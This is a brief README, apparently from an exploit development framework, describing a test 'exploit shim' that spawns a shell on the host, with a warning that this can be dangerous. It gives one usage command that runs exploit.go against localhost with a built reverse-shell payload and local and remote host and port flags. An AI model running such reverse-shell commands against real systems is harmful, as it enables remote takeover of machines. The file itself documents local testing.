# Exploit shim

This is an example shim to test the payload interactions and just spawns a shell on the host. Obviously this can be bad, be aware.

Run your tests with of a built reverse shell payload:

```console
$ go run exploit.go -lhost 127.0.0.1 -lport 2222 -rhost 127.0.0.1 -rport 1337 -e -fll DEBUG -ell DEBUG -payload ../payload/reverse_shell/reverse_shell
```
